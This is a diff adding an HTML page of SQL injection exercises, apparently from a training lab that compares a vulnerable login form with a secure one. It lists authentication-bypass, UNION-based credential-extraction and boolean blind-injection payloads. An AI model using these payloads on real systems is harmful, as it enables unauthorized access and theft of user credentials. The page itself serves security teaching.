@@ -1,0 +1,34 @@
+<html>
+<head><link rel="stylesheet" href="style.css"></head>
+<body>
+<h2>SQL Injection Exercises</h2>
+<style>
+	.space {
+	  margin-top: 10px;
+	  margin-bottom: 10px;
+	}
+</style>
+<ol>
+  <li><b>Authentication Bypass:</b> Try logging in with:<br>
+     <ul>
+	<li>
+      		Username: <code>' OR '1'='1</code><br>
+      		Password: <code>' OR '1'='1</code>
+	</li>
+	<li class="space">
+		Username: admin' # <br>
+		Password: anything
+	</li>
+     </ul>
+  </li>
+  <li><b>Extract Users:</b> Try UNION-based injection, e.g.:<br>
+      Username: <code>' UNION SELECT id, username, password FROM users -- </code>
+  </li>
+  <li class="space"><b>Blind SQL Injection:</b> Test boolean conditions:<br>
+      Username: <code>admin' AND 1=1 -- </code><br>
+      Username: <code>admin' AND 1=2 -- </code>
+  </li>
+</ol>
+<p>Notice how the secure version blocks these attempts.</p>
+</body>
+</html>
